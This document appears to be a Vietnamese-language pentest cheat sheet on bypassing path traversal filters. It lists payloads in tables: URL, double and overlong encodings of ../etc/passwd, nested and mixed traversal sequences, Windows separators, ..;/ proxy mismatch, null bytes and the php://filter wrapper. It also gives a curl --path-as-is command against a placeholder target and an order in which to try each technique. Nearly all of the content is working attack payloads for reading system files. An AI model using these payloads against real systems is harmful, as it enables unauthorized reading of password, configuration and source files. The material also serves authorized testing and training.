# Bypass Techniques - Practical

## 1. Encoding bypass

| Technique         | Payload example                     | Khi nào dùng                    |
| ----------------- | ----------------------------------- | ------------------------------- |
| URL encode        | `%2e%2e%2fetc%2fpasswd`             | Filter plain text `../`         |
| Double URL encode | `%252e%252e%252fetc%252fpasswd`     | Có 2 lần decode trên path       |
| Mixed encode      | `..%2f..%2fetc/passwd`              | Filter không nhất quán          |
| Overlong UTF-8    | `..%c0%af..%c0%afetc%c0%afpasswd`   | Parser cũ/không chuẩn           |
| Unicode form      | `%u002e%u002e%u2215etc%u2215passwd` | Stack decode theo unicode route |

## 2. Path normalization bypass

| Technique            | Payload example                       | Khi nào dùng                  |
| -------------------- | ------------------------------------- | ----------------------------- |
| Nested traversal     | `....//....//etc/passwd`              | App strip `../` 1 lần         |
| Slash confusion      | `..////..////etc/passwd`              | Canonicalization yếu          |
| Dot mangling         | `..././..././etc/passwd`              | WAF regex đơn giản            |
| Prefix hold + escape | `/var/www/images/../../../etc/passwd` | Bắt buộc start with base path |
| Absolute path        | `/etc/passwd`                         | Traversal sequence bị block   |
| Windows separator    | `..\..\..\windows\win.ini`            | App parse theo Windows path   |

## 3. Filter evasion

| Technique                 | Payload example                                         | Khi nào dùng                    |
| ------------------------- | ------------------------------------------------------- | ------------------------------- |
| Reverse proxy mismatch    | `..;/..;/..;/etc/passwd`                                | NGINX/Tomcat parser khác nhau   |
| Case-insensitive protocol | `PhP://filter/...`                                      | Filter theo lowercase literal   |
| Null byte (legacy)        | `../../../etc/passwd%00.png`                            | Extension check trên runtime cũ |
| Wrapper protocol          | `php://filter/convert.base64-encode/resource=index.php` | Include/read trên PHP           |

## 4. Client-side normalization bypass

- Vấn đề: một số client/SDK tự động collapse `../` trước khi gửi request.
- Giải pháp: dùng `curl --path-as-is` để giữ nguyên payload.

```bash
curl --path-as-is "http://TARGET/download?file=../../../../etc/passwd"
```

- Nếu đọc pseudo-file (`/proc/...`) bị ngắt sớm, có thể thêm `--ignore-content-length`.

## 5. Prefix/suffix validation bypass strategy

- Prefix check:
  - Thêm prefix hợp lệ rồi escape ra ngoài: `/allowed/path/../../../etc/passwd`.
- Suffix check (`.png`, `.php`):
  - Thử `%00` trong legacy stack.
  - Thử parser mismatch và canonical equivalents (`/etc/passwd/.`, `/etc//passwd`).

## 6. Practical order (để tiết kiệm thời gian)

1. Plain traversal + absolute path.
2. Nested traversal (`....//`).
3. URL encode -> double encode.
4. Windows separator/drive path.
5. Protocol/wrapper payload nếu stack PHP.
6. Proxy/parser mismatch payload (`..;/`).
